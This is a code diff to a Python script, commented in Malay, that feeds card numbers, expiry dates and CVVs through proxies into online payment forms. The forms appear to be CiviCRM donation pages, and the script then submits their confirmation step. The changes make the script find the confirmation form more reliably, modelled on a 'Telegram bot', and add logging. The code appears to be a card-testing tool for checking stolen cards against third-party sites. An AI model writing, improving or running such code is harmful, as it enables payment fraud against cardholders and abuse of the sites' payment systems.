@@ -264,6 +264,7 @@ def process_site_for_payload(url, override_proxy=None):
     return {'url': url, 'status': 'success', 'payload': payload, 'form_action': form_action, 'qfkey': qfkey, 'has_authorize': has_authorize, 'session': session, 'proxy_url': proxy_url}
 
 def extract_confirmation_form(html, soup):
+    # GUNA CARA TELEGRAM BOT CARI FORM CONFIRM
     confirm_form = soup.find('form', {'id': 'Confirm'})
     if not confirm_form:
         possible_forms = soup.find_all('form')
@@ -380,13 +381,20 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
-            confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
-            is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url or 'qfKey=' in response.url
+            # CARI FORM CONFIRM MACAM TELEGRAM BOT
+            confirm_form = soup_resp.find('form', {'id': 'Confirm'})
+            if not confirm_form:
+                possible_forms = soup_resp.find_all('form')
+                if possible_forms:
+                    confirm_form = possible_forms[0]
+                    logging.info("Confirm Form tak jumpa ID, pakai form pertama")
+                else:
+                    logging.info("Confirm Form tak jumpa langsung!")
             
-            if confirm_btn or is_confirmation:
-                confirm_form, confirm_action, new_qfkey = extract_confirmation_form(response.text, soup_resp)
-                
-                qfkey_to_use = new_qfkey if new_qfkey else qfkey
+            if confirm_form:
+                confirm_action = confirm_form.get('action')
+                new_qfkey_input = confirm_form.find('input', {'name': 'qfKey'})
+                qfkey_to_use = new_qfkey_input['value'] if new_qfkey_input and 'value' in new_qfkey_input.attrs else qfkey
 
                 confirm_post_url = form_action
                 if confirm_action:
@@ -405,11 +413,10 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 })
 
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, detected_price, is_confirm=True, new_qfkey=qfkey_to_use)
-                
-                # Hantar POST kedua tanpa follow redirect automatik
                 confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=TIMEOUT_SECONDS + 2, allow_redirects=False)
                 
-                # Jika server bagi redirect (302/303), kita ikut manual ke page _qf_Main_display=true
+                logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
+                
                 if confirm_response.status_code in [301, 302, 303, 307, 308]:
                     redirect_url = confirm_response.headers.get('Location')
                     if redirect_url:
